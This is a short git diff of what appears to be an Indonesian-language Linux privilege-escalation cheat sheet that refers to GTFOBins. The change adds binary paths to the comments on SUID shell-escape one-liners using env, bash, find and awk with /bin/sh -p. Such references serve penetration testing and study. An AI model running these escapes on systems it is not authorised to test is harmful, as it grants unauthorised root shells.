@@ -39,10 +39,10 @@ Untuk tiap binary → cek di [https://gtfobins.github.io](https://gtfobins.githu
 
 ```bash
 ./binary -p ...                       # -p mempertahankan euid
-env /bin/sh -p                        # SUID env
-bash -p                               # SUID bash
-find . -exec /bin/sh -p \; -quit      # SUID find
-awk 'BEGIN{system("/bin/sh")}'        # SUID awk (mawk)
+env /bin/sh -p                        # SUID env /usr/bin/env
+bash -p                               # SUID bash /usr/bin/bash
+find . -exec /bin/sh -p \; -quit      # SUID find /usr/bin/find
+awk 'BEGIN{system("/bin/sh")}'        # SUID awk (mawk) /usr/bin/awk
 ```
 
 | Binary | Teknik | Catatan |
